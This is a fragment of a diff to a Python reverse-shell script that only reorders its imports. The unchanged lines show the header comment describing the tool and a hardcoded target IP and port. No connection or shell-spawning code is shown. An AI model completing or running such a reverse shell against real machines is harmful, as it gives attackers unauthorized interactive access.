@@ -1,9 +1,9 @@
 #!/usr/bin/python3
 #Simple python reverse shell. Set up a netcat listener, change the IP:Port and run
-import sys
-import socket
 import os
 import pty
+import socket
+import sys
 
 target_ip = "192.168.1.127" #CHANGE THIS
 target_port = "1337" #CHANGE THIS
